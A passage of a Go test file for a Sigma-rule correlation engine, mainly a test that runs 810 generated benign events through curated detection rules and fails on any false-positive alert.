				t.Logf("  → %s (%s)", a.Title, a.Level)
			}
		})
	}
}

// TestBenignEventsZeroAlerts verifies no false positives from benign traffic.
func TestBenignEventsZeroAlerts(t *testing.T) {
	rulesRoot := filepath.Join("..", "..", "rules")
	allRules, _ := correlate.LoadRulesFromDir(filepath.Join(rulesRoot, "sigma_curated"))
	lsMap, _ := correlate.LoadLogsourceMap(filepath.Join("..", "..", "parsers", "logsource_map.yaml"))

	registry := correlate.NewRuleRegistry(allRules)
	engine := correlate.NewRuleEngine(registry, lsMap)

	benign := generateBenignEvents(810)
	var fpCount int
	for i, ev := range benign {
		alerts := engine.Evaluate(ev)
		if len(alerts) > 0 {
			fpCount += len(alerts)
			for _, a := range alerts {
				t.Errorf("FP at event %d: %s (%s)", i, a.Title, a.RuleID)
			}
		}
	}

	if fpCount > 0 {
		t.Fatalf("%d false positives from %d benign events", fpCount, len(benign))
	}
	t.Logf("0 false positives from %d benign events", len(benign))
}

// Ensure we import fmt for logging.
var _ = fmt.Sprintf
